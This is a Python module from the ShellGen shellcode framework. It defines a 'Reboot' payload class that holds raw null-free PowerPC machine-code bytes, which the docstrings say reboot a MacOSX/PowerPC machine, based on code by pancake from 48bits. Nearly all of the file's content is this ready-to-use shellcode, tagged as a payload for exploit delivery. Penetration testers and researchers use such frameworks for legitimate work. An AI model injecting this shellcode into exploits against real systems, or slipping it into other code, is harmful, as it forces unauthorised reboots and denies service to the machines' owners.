#!/usr/bin/env python

###############################################################################
## Reboot the machine on MacOSX/PowerPC                                      ##
## Shellcode for ShellGen                                                    ##
## Based on original code by pancake from 48bits                             ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2015 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Reboot the machine."

__all__ = ["Reboot"]

from shellgen import Static

class Reboot (Static):
    """
    Reboot the machine on MacOSX/PowerPC.

    Based on original code by pancake from 48bits:
    U{http://radare.org/y/}
    """

    qualities = "payload"
    encoding  = "nullfree"

    bytes = (
        "\x7c\x63\x1a\x79\x39\x40\x01\x70\x38\x0a\xfe\xb4\x44\xff\xff\x02\x60\x60\x60\x60"
        "\x38\x0a\xfe\xc7\x44\xff\xff\x02"
    )
